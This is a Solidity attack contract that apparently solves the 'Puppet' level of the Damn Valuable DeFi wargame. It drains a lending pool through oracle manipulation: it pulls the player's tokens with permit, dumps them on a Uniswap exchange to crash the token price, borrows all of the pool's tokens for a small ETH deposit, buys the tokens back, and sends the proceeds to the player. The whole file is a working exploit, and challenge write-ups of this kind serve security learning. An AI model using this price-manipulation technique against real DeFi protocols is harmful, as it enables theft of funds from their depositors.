pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../puppet/PuppetPool.sol";

import "hardhat/console.sol";

contract AttackPuppet {
  DamnValuableToken dvt;
  PuppetPool pool;

  constructor(
    uint256 initPlayerTokens,
    uint256 initPoolTokens,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s,
    address uniswap,
    address _token,
    address _pool
  ) payable {

    dvt = DamnValuableToken(_token);
    pool = PuppetPool(_pool);

    // Call permit function with signature provided to allow us 
    // to transfer the tokens to the contract in one transaction
    dvt.permit(
      msg.sender,
      address(this),
      initPlayerTokens,
      deadline,
      v,
      r,
      s
    );
    dvt.transferFrom(msg.sender, address(this), initPlayerTokens);
    printTokenAmounts(address(this));

    // Approve token to swap with UniSwap
    dvt.approve(uniswap, initPlayerTokens);
    // Transfer all Tokens for Eth to heavily devalue the Tokens
    bytes memory tok2Eth = abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", initPlayerTokens, 9 ether, deadline);
    (bool success, bytes memory returnData) = uniswap.call(tok2Eth);
    require(success, "failed to swap");

    printTokenAmounts(address(this));
    
    // Get the new deposit required with the new heavily devalued Token
    // to get ALL tokens in the pool
    uint256 deposit = pool.calculateDepositRequired(initPoolTokens);
    pool.borrow{value: deposit}(initPoolTokens, address(this));
    printTokenAmounts(address(this));

    // Calculate the ethPrice required to get all our original tokens back
    bytes memory eth2TokPrice = abi.encodeWithSignature("getEthToTokenOutputPrice(uint256)", initPlayerTokens);
    (success, returnData) = uniswap.call(eth2TokPrice);
    require(success, "failed to get eth price");
    uint256 ethPrice = uint256(bytes32(returnData));
    console.log("Price", ethPrice);

    // Swap eth again to get our initial tokens back
    bytes memory eth2Tok = abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", initPlayerTokens, deadline);
    (success, returnData) = uniswap.call{value: ethPrice}(eth2Tok);
    require(success, "failed to get Tokens back");
    printTokenAmounts(address(this));

    // Transfer all Tokens and eth back to the player EOA
    dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
    payable(msg.sender).transfer(address(this).balance);
  }

  // Helper function to print balances (only works in hardhat)
  function printTokenAmounts(address _add) internal view {
    console.log("DVT", dvt.balanceOf(_add));
    console.log("ETH", _add.balance);
    console.log("");
  }
}